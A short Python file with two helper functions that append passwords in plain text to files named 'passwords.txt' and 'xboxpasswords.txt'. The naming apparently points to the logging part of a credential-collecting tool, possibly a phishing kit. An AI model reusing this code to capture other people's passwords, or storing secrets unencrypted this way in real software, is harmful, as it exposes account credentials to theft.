import os
import io
import os.path

def writePasswordToFile(password):
	try:
		with io.open(os.path.abspath(os.pardir) + '/passwords.txt', 'a', encoding='utf-8') as file:
				file.write(password + '\n\n')
	except Exception as e:
		print(e)

def writeXboxPasswordToFile(password):
	try:
		with io.open(os.path.abspath(os.pardir) + '/xboxpasswords.txt', 'a', encoding='utf-8') as file:
				file.write(password + '\n\n')
	except Exception as e:
		print(e)